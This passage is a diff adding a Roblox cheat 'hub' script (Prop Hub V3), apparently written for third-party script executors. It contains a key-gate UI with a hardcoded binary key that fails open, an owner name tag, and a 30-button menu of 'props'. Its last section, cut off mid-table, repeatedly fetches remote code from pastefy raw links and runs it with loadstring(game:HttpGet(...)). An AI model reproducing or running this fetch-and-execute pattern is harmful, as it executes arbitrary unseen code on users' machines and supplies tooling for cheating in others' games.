@@ -1,0 +1,1081 @@
+-- This file was generated at discord.gg/syncrypt
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local s1 = "01000011010011110100111101001100010001100101010101001100"
+local function v7(p1)
+    if type(p1) ~= "string" then
+        return false
+    end
+
+    return p1:gsub("%s+", "") == s1
+end
+local color3 = Color3.fromRGB(145, 90, 255)
+local t1 = {
+	Enabled = true,
+	Title = "PROP HUB V3",
+	Subtitle = "Key required",
+	DiscordLink = "https://discord.gg/jFJQj22gjt",
+	MaxAttempts = 3,
+	CooldownTime = 5,
+	AccentColor = color3
+}
+if t1.Enabled then
+    local ok, result = pcall(function()
+        local ok, result = pcall(function()
+            return LocalPlayer:GetAttribute("PropHubUnlocked")
+        end)
+        if ok then
+            ok = result == true
+        end
+        if ok then
+            return true
+        end
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "PropHubKeySystem"
+        ScreenGui.ResetOnSpawn = false
+        ScreenGui.IgnoreGuiInset = true
+        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        ScreenGui.Parent = PlayerGui
+        local u54 = false
+        local Frame = Instance.new("Frame")
+        Frame.Name = "KeyWindow"
+        Frame.Size = UDim2.fromOffset(320, 160)
+        Frame.Position = UDim2.new(0.5, -160, 0.5, -80)
+        Frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+        Frame.BorderSizePixel = 0
+        Frame.Active = true
+        Frame.ClipsDescendants = true
+        Frame.Parent = ScreenGui
+        local UICorner = Instance.new("UICorner")
+        UICorner.CornerRadius = UDim.new(0, 18)
+        UICorner.Parent = Frame
+        local UIStroke = Instance.new("UIStroke")
+        UIStroke.Color = Color3.fromRGB(55, 55, 65)
+        UIStroke.Thickness = 1.5
+        UIStroke.Transparency = 0.3
+        UIStroke.Parent = Frame
+        local Frame2 = Instance.new("Frame")
+        Frame2.Size = UDim2.new(1, 0, 1, 0)
+        Frame2.BackgroundTransparency = 1
+        Frame2.Parent = Frame
+        local UIGradient = Instance.new("UIGradient")
+        UIGradient.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 20, 50)),
+			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(18, 18, 22)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 20, 60))
+		})
+        UIGradient.Rotation = 135
+        UIGradient.Transparency = NumberSequence.new({
+			NumberSequenceKeypoint.new(0, 0.55),
+			NumberSequenceKeypoint.new(1, 0.75)
+		})
+        UIGradient.Parent = Frame2
+        local Frame3 = Instance.new("Frame")
+        Frame3.Name = "DragBar"
+        Frame3.Size = UDim2.new(1, 0, 0, 44)
+        Frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        Frame3.BackgroundTransparency = 0.4
+        Frame3.BorderSizePixel = 0
+        Frame3.Active = true
+        Frame3.Parent = Frame
+        local Frame4 = Instance.new("Frame")
+        Frame4.Size = UDim2.fromOffset(5, 20)
+        Frame4.Position = UDim2.fromOffset(12, 12)
+        Frame4.BackgroundColor3 = t1.AccentColor
+        Frame4.BorderSizePixel = 0
+        Frame4.Parent = Frame3
+        local UICorner2 = Instance.new("UICorner")
+        UICorner2.CornerRadius = UDim.new(1, 0)
+        UICorner2.Parent = Frame4
+        local TextLabel = Instance.new("TextLabel")
+        TextLabel.BackgroundTransparency = 1
+        TextLabel.Position = UDim2.fromOffset(24, 4)
+        TextLabel.Size = UDim2.new(1, -70, 0, 36)
+        TextLabel.Text = t1.Title
+        TextLabel.TextColor3 = Color3.fromRGB(240, 240, 245)
+        TextLabel.TextSize = 15
+        TextLabel.Font = Enum.Font.GothamBold
+        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+        TextLabel.Parent = Frame3
+        local TextLabel2 = Instance.new("TextLabel")
+        TextLabel2.BackgroundTransparency = 1
+        TextLabel2.Position = UDim2.new(1, -120, 0, 4)
+        TextLabel2.Size = UDim2.fromOffset(100, 36)
+        TextLabel2.Text = t1.Subtitle
+        TextLabel2.TextColor3 = Color3.fromRGB(160, 160, 175)
+        TextLabel2.TextSize = 10
+        TextLabel2.Font = Enum.Font.Gotham
+        TextLabel2.TextXAlignment = Enum.TextXAlignment.Right
+        TextLabel2.Parent = Frame3
+        local TextBox = Instance.new("TextBox")
+        TextBox.Size = UDim2.new(1, -24, 0, 36)
+        TextBox.Position = UDim2.fromOffset(12, 54)
+        TextBox.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
+        TextBox.BackgroundTransparency = 0.2
+        TextBox.BorderSizePixel = 0
+        TextBox.Text = ""
+        TextBox.PlaceholderText = "Paste binary key..."
+        TextBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 135)
+        TextBox.TextColor3 = Color3.fromRGB(235, 235, 240)
+        TextBox.TextSize = 10
+        TextBox.Font = Enum.Font.Code
+        TextBox.ClearTextOnFocus = false
+        TextBox.Parent = Frame
+        local UICorner3 = Instance.new("UICorner")
+        UICorner3.CornerRadius = UDim.new(0, 10)
+        UICorner3.Parent = TextBox
+        local UIStroke2 = Instance.new("UIStroke")
+        UIStroke2.Color = Color3.fromRGB(48, 48, 58)
+        UIStroke2.Thickness = 1
+        UIStroke2.Transparency = 0.25
+        UIStroke2.Parent = TextBox
+        local function v68(p2, p3, p4, p5, p6)
+            local TextButton = Instance.new("TextButton")
+
+            TextButton.Size = UDim2.new(0, p4, 0, 36)
+            TextButton.Position = UDim2.fromOffset(p3, 98)
+
+            local v129 = p5
+
+            if p5 then
+                v129 = t1.AccentColor
+            end
+
+            if not v129 then
+                v129 = Color3.fromRGB(28, 28, 35)
+            end
+
+            TextButton.BackgroundColor3 = v129
+            TextButton.BackgroundTransparency = p5 and 0 or 0.2
+            TextButton.BorderSizePixel = 0
+            TextButton.Text = p2
+
+            local v130 = p5
+
+            if p5 then
+                v130 = Color3.fromRGB(255, 255, 255)
+            end
+
+            if not v130 then
+                v130 = Color3.fromRGB(220, 220, 230)
+            end
+
+            TextButton.TextColor3 = v130
+            TextButton.TextSize = p6 or 11
+            TextButton.Font = Enum.Font.GothamBold
+            TextButton.AutoButtonColor = false
+            TextButton.Parent = Frame
+
+            local UICorner4 = Instance.new("UICorner")
+
+            UICorner4.CornerRadius = UDim.new(0, 10)
+            UICorner4.Parent = TextButton
+
+            local UIStroke3 = Instance.new("UIStroke")
+            local v133 = p5
+
+            if p5 then
+                v133 = Color3.fromRGB(180, 130, 255)
+            end
+
+            if not v133 then
+                v133 = Color3.fromRGB(80, 80, 95)
+            end
+
+            UIStroke3.Color = v133
+            UIStroke3.Thickness = 1
+            UIStroke3.Transparency = not p5 and 0.4 or 0.5
+            UIStroke3.Parent = TextButton
+
+            return TextButton
+        end
+        local v69 = v68("UNLOCK", 12, 100, true, 11)
+        local v70 = v68("DISCORD", 118, 90, false, 10)
+        local v71 = v68("PASTE", 214, 94, false, 10)
+        local TextLabel3 = Instance.new("TextLabel")
+        TextLabel3.Size = UDim2.new(1, -24, 0, 16)
+        TextLabel3.Position = UDim2.fromOffset(12, 138)
+        TextLabel3.BackgroundTransparency = 1
+        TextLabel3.Text = ""
+        TextLabel3.TextColor3 = Color3.fromRGB(255, 100, 100)
+        TextLabel3.TextSize = 10
+        TextLabel3.Font = Enum.Font.GothamMedium
+        TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
+        TextLabel3.Parent = Frame
+        local n1 = 0
+        local u74 = false
+        local function v75(p7, p8)
+            TextLabel3.Text = p7
+
+            local v136 = TextLabel3
+
+            if p8 then
+                p8 = Color3.fromRGB(255, 100, 100)
+            end
+
+            if not p8 then
+                p8 = Color3.fromRGB(120, 255, 160)
+            end
+
+            v136.TextColor3 = p8
+            TextLabel3.TextTransparency = 1
+            TweenService:Create(TextLabel3, TweenInfo.new(0.2), {
+				TextTransparency = 0
+			}):Play()
+        end
+        local function v76()
+            local XOffset = TextBox.Position.X.Offset
+
+            for i = 1, 6 do
+                local v139 = i % 2 ~= 0 and -6 or 6
+
+                TextBox.Position = UDim2.new(TextBox.Position.X.Scale, XOffset + v139, TextBox.Position.Y.Scale, TextBox.Position.Y.Offset)
+                task.wait(0.03)
+            end
+
+            TextBox.Position = UDim2.new(TextBox.Position.X.Scale, XOffset, TextBox.Position.Y.Scale, TextBox.Position.Y.Offset)
+        end
+        local function v77()
+            u54 = true
+            pcall(function()
+                LocalPlayer:SetAttribute("PropHubUnlocked", true)
+            end)
+            v75("✓ Access granted!", false)
+            print("[Prop Hub] Key accepted. Unlocking...")
+
+            local v140 = TweenService
+            local v141 = Frame
+            local tweenInfo = TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+            local uDim2 = UDim2.fromOffset(0, 0)
+            local uDim2_2 = UDim2.new(0.5, 0, 0.5, 0)
+
+            v140:Create(v141, tweenInfo, {
+				Size = uDim2,
+				Position = uDim2_2
+			}):Play()
+            task.wait(0.35)
+            ScreenGui:Destroy()
+        end
+        local function v78()
+            if u74 then
+                return
+            end
+
+            local TextBoxText = TextBox.Text
+
+            if TextBoxText == "" then
+                v75("Please enter a key.", true)
+                v76()
+
+                return
+            end
+
+            v69.Text = "CHECKING..."
+            task.wait(0.25)
+
+            if v7(TextBoxText) then
+                v77()
+
+                return
+            end
+
+            n1 += 1
+            v76()
+            v69.Text = "UNLOCK"
+
+            if n1 >= t1.MaxAttempts then
+                local CooldownTime = t1.CooldownTime
+
+                u74 = true
+                v69.Text = "LOCKED"
+                v69.BackgroundColor3 = Color3.fromRGB(60, 40, 60)
+                TextBox.TextEditable = false
+                task.spawn(function()
+                    for i = CooldownTime, 1, -1 do
+                        v75("Too many attempts. Wait " .. i .. "s...", true)
+                        task.wait(1)
+                    end
+
+                    n1 = 0
+                    u74 = false
+                    v69.Text = "UNLOCK"
+                    v69.BackgroundColor3 = t1.AccentColor
+                    TextBox.TextEditable = true
+                    v75("You can try again.", false)
+                end)
+
+                return
+            end
+
+            v75("Invalid key. (" .. n1 .. "/" .. t1.MaxAttempts .. ")", true)
+        end
+        v69.Activated:Connect(v78)
+        TextBox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                v78()
+            end
+        end)
+        v70.Activated:Connect(function()
+            if setclipboard then
+                setclipboard(t1.DiscordLink)
+                v75("Discord link copied!", false)
+
+                return
+            end
+
+            v75("Clipboard not supported.", true)
+        end)
+        v71.Activated:Connect(function()
+            local v149
+            if getclipboard then
+                v149 = getclipboard()
+            else
+                local _syn = syn
+
+                if _syn then
+                    _syn = syn.clipboard
+                end
+
+                if _syn then
+                    v149 = syn.clipboard()
+                end
+            end
+            if v149 and v149 ~= "" then
+                TextBox.Text = v149
+                v75("Pasted from clipboard.", false)
+
+                return
+            end
+            v75("Clipboard empty or unsupported.", true)
+        end)
+        local function v79(p9, p10, p11, p12)
+            local v155 = TweenService
+            local tweenInfo = TweenInfo.new(0.15)
+            local v157 = p10
+
+            if p10 then
+                v157 = p11:Lerp(Color3.new(1, 1, 1), 0.15)
+            end
+
+            local v158 = v157 or p11
+
+            if p10 then
+                p10 = math.max(p12 - 0.1, 0)
+            end
+
+            local v159 = p10 or p12
+
+            v155:Create(p9, tweenInfo, {
+				BackgroundColor3 = v158,
+				BackgroundTransparency = v159
+			}):Play()
+        end
+        v69.MouseEnter:Connect(function()
+            v79(v69, true, t1.AccentColor, 0)
+        end)
+        v69.MouseLeave:Connect(function()
+            v79(v69, false, t1.AccentColor, 0)
+        end)
+        v70.MouseEnter:Connect(function()
+            v79(v70, true, Color3.fromRGB(28, 28, 35), 0.2)
+        end)
+        v70.MouseLeave:Connect(function()
+            v79(v70, false, Color3.fromRGB(28, 28, 35), 0.2)
+        end)
+        v71.MouseEnter:Connect(function()
+            v79(v71, true, Color3.fromRGB(28, 28, 35), 0.2)
+        end)
+        v71.MouseLeave:Connect(function()
+            v79(v71, false, Color3.fromRGB(28, 28, 35), 0.2)
+        end)
+        local u80 = false
+        local inputPosition
+        local FramePosition
+        Frame3.InputBegan:Connect(function(input)
+            local v161 = input.UserInputType == Enum.UserInputType.MouseButton1
+
+            if not v161 then
+                v161 = input.UserInputType == Enum.UserInputType.Touch
+            end
+
+            if v161 then
+                u80 = true
+                inputPosition = input.Position
+                FramePosition = Frame.Position
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        u80 = false
+                    end
+                end)
+            end
+        end)
+        UserInputService.InputChanged:Connect(function(input)
+            local v163 = u80
+
+            if v163 then
+                v163 = input.UserInputType == Enum.UserInputType.MouseMovement
+
+                if not v163 then
+                    v163 = input.UserInputType == Enum.UserInputType.Touch
+                end
+            end
+
+            if v163 then
+                local v164 = input.Position - inputPosition
+
+                Frame.Position = UDim2.new(FramePosition.X.Scale, FramePosition.X.Offset + v164.X, FramePosition.Y.Scale, FramePosition.Y.Offset + v164.Y)
+            end
+        end)
+        task.spawn(function()
+            task.wait(0.15)
+            pcall(function()
+                TextBox:CaptureFocus()
+            end)
+        end)
+        while not u54 do
+            task.wait(0.1)
+        end
+
+        return true
+    end)
+
+    if not ok then
+        warn("[Prop Hub] Key system error: " .. tostring(result))
+        warn("[Prop Hub] Continuing without verification (fail-open).")
+    end
+end
+local function v12()
+    if LocalPlayer.Name ~= "c00lful" then
+        return
+    end
+
+    local Character = LocalPlayer.Character
+
+    if not Character then
+        return
+    end
+
+    local Head = Character:FindFirstChild("Head")
+
+    if not Head then
+        return
+    end
+
+    local OwnerTag = Head:FindFirstChild("OwnerTag")
+
+    if OwnerTag then
+        OwnerTag:Destroy()
+    end
+
+    local BillboardGui = Instance.new("BillboardGui")
+
+    BillboardGui.Name = "OwnerTag"
+    BillboardGui.Size = UDim2.new(0, 220, 0, 40)
+    BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
+    BillboardGui.AlwaysOnTop = true
+    BillboardGui.Parent = Head
+
+    local TextLabel = Instance.new("TextLabel")
+
+    TextLabel.Size = UDim2.new(1, 0, 1, 0)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Text = "c00lful OWNER"
+    TextLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
+    TextLabel.TextStrokeTransparency = 0.3
+    TextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel.TextSize = 18
+    TextLabel.Font = Enum.Font.GothamBold
+    TextLabel.TextScaled = true
+    TextLabel.TextWrapped = true
+    TextLabel.Parent = BillboardGui
+end
+if LocalPlayer.Character then
+    v12()
+end
+LocalPlayer.CharacterAdded:Connect(function(character)
+    character:WaitForChild("Head", 5)
+    v12()
+end)
+local t2 = {
+	ImageId = "rbxassetid://79148306484407",
+	Transparency = 0.15,
+	OverlayDarkness = 0.35,
+	GradientAlpha = 0.55
+}
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "Prop Hub V3"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = PlayerGui
+local Frame = Instance.new("Frame")
+Frame.Name = "Main"
+Frame.Size = UDim2.fromOffset(540, 400)
+Frame.Position = UDim2.new(0.5, -270, 0.5, -200)
+Frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.ClipsDescendants = true
+Frame.Parent = ScreenGui
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 18)
+UICorner.Parent = Frame
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(55, 55, 65)
+UIStroke.Thickness = 1.5
+UIStroke.Transparency = 0.3
+UIStroke.Parent = Frame
+local Frame5 = Instance.new("Frame")
+Frame5.Name = "DecalContainer"
+Frame5.Size = UDim2.new(1, 0, 1, 0)
+Frame5.BackgroundTransparency = 1
+Frame5.Parent = Frame
+local ImageLabel = Instance.new("ImageLabel")
+ImageLabel.Name = "BackgroundImage"
+ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.Image = t2.ImageId
+ImageLabel.ImageTransparency = t2.Transparency
+ImageLabel.ScaleType = Enum.ScaleType.Stretch
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Parent = Frame5
+local Frame6 = Instance.new("Frame")
+Frame6.Name = "DarkOverlay"
+Frame6.Size = UDim2.new(1, 0, 1, 0)
+Frame6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame6.BackgroundTransparency = 1 - t2.OverlayDarkness
+Frame6.BorderSizePixel = 0
+Frame6.Parent = Frame5
+local Frame7 = Instance.new("Frame")
+Frame7.Name = "GradientOverlay"
+Frame7.Size = UDim2.new(1, 0, 1, 0)
+Frame7.BackgroundTransparency = 1
+Frame7.BorderSizePixel = 0
+Frame7.Parent = Frame5
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 10, 40)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 10, 40))
+})
+UIGradient.Transparency = NumberSequence.new({
+	NumberSequenceKeypoint.new(0, 1 - t2.GradientAlpha),
+	NumberSequenceKeypoint.new(0.5, 0.85),
+	NumberSequenceKeypoint.new(1, 1 - t2.GradientAlpha)
+})
+UIGradient.Rotation = 45
+UIGradient.Parent = Frame7
+function SetDecalImage(p13, p14)
+    if ImageLabel then
+        local v91 = not string.match(p13, "^rbxassetid://")
+
+        if v91 then
+            v91 = not string.match(p13, "^https://")
+        end
+
+        if v91 then
+            p13 = "rbxassetid://" .. p13
+        end
+
+        ImageLabel.Image = p13
+
+        if p14 then
+            ImageLabel.ImageTransparency = p14
+        end
+
+        ImageLabel.Visible = true
+    end
+end
+local Frame8 = Instance.new("Frame")
+Frame8.Name = "DragBar"
+Frame8.Size = UDim2.new(1, 0, 0, 52)
+Frame8.BackgroundTransparency = 1
+Frame8.Active = true
+Frame8.Parent = Frame
+local Frame9 = Instance.new("Frame")
+Frame9.Name = "TopBarGlass"
+Frame9.Size = UDim2.new(1, 0, 1, 0)
+Frame9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame9.BackgroundTransparency = 0.4
+Frame9.BorderSizePixel = 0
+Frame9.Parent = Frame8
+local Frame10 = Instance.new("Frame")
+Frame10.Size = UDim2.fromOffset(5, 23)
+Frame10.Position = UDim2.fromOffset(14, 14)
+Frame10.BackgroundColor3 = Color3.fromRGB(145, 90, 255)
+Frame10.BorderSizePixel = 0
+Frame10.Parent = Frame8
+local UICorner5 = Instance.new("UICorner")
+UICorner5.CornerRadius = UDim.new(1, 0)
+UICorner5.Parent = Frame10
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Name = "Title"
+TextLabel.BackgroundTransparency = 1
+TextLabel.Position = UDim2.fromOffset(28, 6)
+TextLabel.Size = UDim2.new(1, -80, 0, 40)
+TextLabel.Text = "PROP HUB V3"
+TextLabel.TextColor3 = Color3.fromRGB(240, 240, 245)
+TextLabel.TextSize = 17
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.Parent = Frame8
+local TextButton = Instance.new("TextButton")
+TextButton.Name = "CloseButton"
+TextButton.Size = UDim2.fromOffset(34, 34)
+TextButton.Position = UDim2.new(1, -44, 0, 9)
+TextButton.BackgroundColor3 = Color3.fromRGB(32, 32, 39)
+TextButton.Text = "✕"
+TextButton.TextColor3 = Color3.fromRGB(230, 230, 235)
+TextButton.TextSize = 20
+TextButton.Font = Enum.Font.GothamMedium
+TextButton.AutoButtonColor = false
+TextButton.Parent = Frame8
+local UICorner6 = Instance.new("UICorner")
+UICorner6.CornerRadius = UDim.new(0, 10)
+UICorner6.Parent = TextButton
+TextButton.Activated:Connect(function()
+    TweenService:Create(Frame, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+		Size = UDim2.fromOffset(0, 0)
+	}):Play()
+    task.wait(0.2)
+    ScreenGui.Enabled = false
+    Frame.Size = UDim2.fromOffset(540, 400)
+end)
+local TextButton2 = Instance.new("TextButton")
+TextButton2.Name = "OpenButton"
+TextButton2.Size = UDim2.fromOffset(120, 45)
+TextButton2.Position = UDim2.new(0.5, -60, 0.5, 200)
+TextButton2.BackgroundColor3 = Color3.fromRGB(145, 90, 255)
+TextButton2.Text = "OPEN PROP HUB"
+TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton2.TextSize = 14
+TextButton2.Font = Enum.Font.GothamBold
+TextButton2.AutoButtonColor = false
+TextButton2.Visible = false
+TextButton2.Parent = ScreenGui
+local UICorner7 = Instance.new("UICorner")
+UICorner7.CornerRadius = UDim.new(0, 12)
+UICorner7.Parent = TextButton2
+local UIStroke4 = Instance.new("UIStroke")
+UIStroke4.Color = Color3.fromRGB(180, 130, 255)
+UIStroke4.Thickness = 2
+UIStroke4.Transparency = 0.5
+UIStroke4.Parent = TextButton2
+TextButton2.Activated:Connect(function()
+    ScreenGui.Enabled = true
+    TextButton2.Visible = false
+    TweenService:Create(Frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+		Size = UDim2.fromOffset(540, 400)
+	}):Play()
+end)
+ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if not ScreenGui.Enabled then
+        TextButton2.Visible = true
+
+        return
+    end
+
+    TextButton2.Visible = false
+end)
+local Frame11 = Instance.new("Frame")
+Frame11.Name = "Buttons"
+Frame11.Size = UDim2.new(1, -24, 1, -64)
+Frame11.Position = UDim2.fromOffset(12, 58)
+Frame11.BackgroundTransparency = 1
+Frame11.Parent = Frame
+local UIGridLayout = Instance.new("UIGridLayout")
+UIGridLayout.Name = "Grid"
+UIGridLayout.CellSize = UDim2.new(0.2, -7, 0, 48)
+UIGridLayout.CellPadding = UDim2.fromOffset(7, 7)
+UIGridLayout.FillDirection = Enum.FillDirection.Horizontal
+UIGridLayout.FillDirectionMaxCells = 5
+UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Top
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.Parent = Frame11
+local t3 = {
+	[1] = "Wing Prop2",
+	[2] = "Wing Prop",
+	[3] = "Shark Prop",
+	[4] = "B2 Spirit Prop",
+	[5] = "Avarice Scythe",
+	[6] = "Gojo Controller",
+	[7] = "Wither Prop",
+	[8] = "Wither Storm",
+	[9] = "Wither Prop2",
+	[10] = "B2-Spirit2",
+	[11] = "Wither3",
+	[12] = "Wither Storm2",
+	[13] = "Verity Prop",
+	[14] = "Godilza Prop",
+	[15] = "Raiden (Dyton security)",
+	[16] = "Nothing Panel(mecha)",
+	[17] = "Wing prop3",
+	[18] = "Ender Dragon",
+	[19] = "Radar Terror",
+	[20] = "B2 Spirit prop3",
+	[21] = "Rodan prop",
+	[22] = "dual spider engine prop",
+	[23] = "Spear prop",
+	[24] = "Curse engine prop",
+	[25] = "sukuna ",
+	[26] = "scmd prop(key xiandi)",
+	[27] = "Avarice prop",
+	[28] = "Eryx (key:ErYxOnToP",
+	[29] = "TXR prop",
+	[30] = "Join Discord"
+}
+for i = 1, 30 do
+    local v37 = i
+    local TextButton3 = Instance.new("TextButton")
+
+    TextButton3.Name = "Button" .. v37
+    TextButton3.LayoutOrder = v37
+    TextButton3.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
+    TextButton3.BackgroundTransparency = 0.2
+    TextButton3.BorderSizePixel = 0
+    TextButton3.Text = t3[v37] or "Button " .. v37
+    TextButton3.TextColor3 = Color3.fromRGB(235, 235, 240)
+    TextButton3.TextSize = 9
+    TextButton3.Font = Enum.Font.GothamMedium
+    TextButton3.TextWrapped = true
+    TextButton3.AutoButtonColor = false
+    TextButton3.Parent = Frame11
+
+    local UICorner8 = Instance.new("UICorner")
+
+    UICorner8.CornerRadius = UDim.new(0, 13)
+    UICorner8.Parent = TextButton3
+
+    local UIStroke5 = Instance.new("UIStroke")
+
+    UIStroke5.Color = Color3.fromRGB(48, 48, 58)
+    UIStroke5.Thickness = 1
+    UIStroke5.Transparency = 0.25
+    UIStroke5.Parent = TextButton3
+
+    local Frame12 = Instance.new("Frame")
+
+    Frame12.Name = "GlassEffect"
+    Frame12.Size = UDim2.new(1, 0, 1, 0)
+    Frame12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Frame12.BackgroundTransparency = 0.9
+    Frame12.BorderSizePixel = 0
+    Frame12.Visible = false
+    Frame12.Parent = TextButton3
+
+    local UICorner9 = Instance.new("UICorner")
+
+    UICorner9.CornerRadius = UDim.new(0, 13)
+    UICorner9.Parent = Frame12
+    TextButton3.Activated:Connect(function()
+        TweenService:Create(TextButton3, TweenInfo.new(0.08), {
+			BackgroundColor3 = Color3.fromRGB(55, 45, 70),
+			BackgroundTransparency = 0.1
+		}):Play()
+        task.delay(0.12, function()
+            if TextButton3.Parent then
+                TweenService:Create(TextButton3, TweenInfo.new(0.12), {
+					BackgroundColor3 = Color3.fromRGB(28, 28, 35),
+					BackgroundTransparency = 0.2
+				}):Play()
+            end
+        end)
+    end)
+    TextButton3.MouseEnter:Connect(function()
+        local v92 = TweenService
+        local v93 = TextButton3
+        local tweenInfo = TweenInfo.new(0.15)
+        local Create = v92.Create
+        local color3_2 = Color3.fromRGB(40, 35, 50)
+
+        Create(v92, v93, tweenInfo, {
+			BackgroundTransparency = 0.05,
+			BackgroundColor3 = color3_2
+		}):Play()
+
+        if Frame12 then
+            Frame12.Visible = true
+            TweenService:Create(Frame12, TweenInfo.new(0.15), {
+				BackgroundTransparency = 0.85
+			}):Play()
+        end
+    end)
+    TextButton3.MouseLeave:Connect(function()
+        local v97 = TweenService
+        local v98 = TextButton3
+        local tweenInfo = TweenInfo.new(0.15)
+        local Create = v97.Create
+        local color3_3 = Color3.fromRGB(28, 28, 35)
+
+        Create(v97, v98, tweenInfo, {
+			BackgroundTransparency = 0.2,
+			BackgroundColor3 = color3_3
+		}):Play()
+
+        if Frame12 then
+            TweenService:Create(Frame12, TweenInfo.new(0.15), {
+				BackgroundTransparency = 0.9
+			}):Play()
+            task.delay(0.15, function()
+                if Frame12 then
+                    Frame12.Visible = false
+                end
+            end)
+        end
+    end)
+end
+local u44 = false
+local p15Position
+local u43
+local function v46(p15)
+    local v107 = p15.UserInputType == Enum.UserInputType.MouseButton1
+
+    if not v107 then
+        v107 = p15.UserInputType == Enum.UserInputType.Touch
+    end
+
+    if v107 then
+        u44 = true
+        p15Position = p15.Position
+        u43 = Frame.Position
+        TweenService:Create(UIStroke, TweenInfo.new(0.2), {
+			Transparency = 0.6
+		}):Play()
+        p15.Changed:Connect(function()
+            if p15.UserInputState == Enum.UserInputState.End then
+                u44 = false
+                TweenService:Create(UIStroke, TweenInfo.new(0.2), {
+					Transparency = 0.3
+				}):Play()
+            end
+        end)
+    end
+end
+Frame8.InputBegan:Connect(v46)
+UserInputService.InputChanged:Connect(function(input)
+    if not u44 then
+        return
+    end
+
+    local v109 = input.UserInputType == Enum.UserInputType.MouseMovement
+
+    if not v109 then
+        v109 = input.UserInputType == Enum.UserInputType.Touch
+    end
+
+    if v109 then
+        local v110 = input.Position - p15Position
+
+        Frame.Position = UDim2.new(u43.X.Scale, u43.X.Offset + v110.X, u43.Y.Scale, u43.Y.Offset + v110.Y)
+    end
+end)
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch then
+        local inputPosition = input.Position
+        local v113 = false
+
+        for _, child in pairs(Frame11:GetChildren()) do
+            if not child:IsA("TextButton") then
+                continue
+            end
+
+            local AbsolutePosition = child.AbsolutePosition
+            local AbsoluteSize = child.AbsoluteSize
+            local v118 = inputPosition.X >= AbsolutePosition.X
+
+            if v118 then
+                v118 = inputPosition.X <= AbsolutePosition.X + AbsoluteSize.X
+
+                if v118 then
+                    v118 = inputPosition.Y >= AbsolutePosition.Y
+
+                    if v118 then
+                        v118 = inputPosition.Y <= AbsolutePosition.Y + AbsoluteSize.Y
+                    end
+                end
+            end
+
+            if v118 then
+                v113 = true
+
+                break
+            end
+        end
+
+        if not v113 then
+            v46(input)
+        end
+    end
+end)
+local t4 = {
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/RM1MkrT4/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/IJHHtWR6/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/thWRWou1/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/b0JRIsKj/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/oneTZn9W/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/3MShESQ2/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/q4Js0TjY/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/5NOFcoUP/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/6jvLhYaS/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/we9aonad/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/0eGHRHNp/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/r4nWQYzg/raw"))()
+end,
+	function()
+    loadstring(game:HttpGet("https://pastefy.app/x1BOck3z/raw"))()
+end,
+	function()
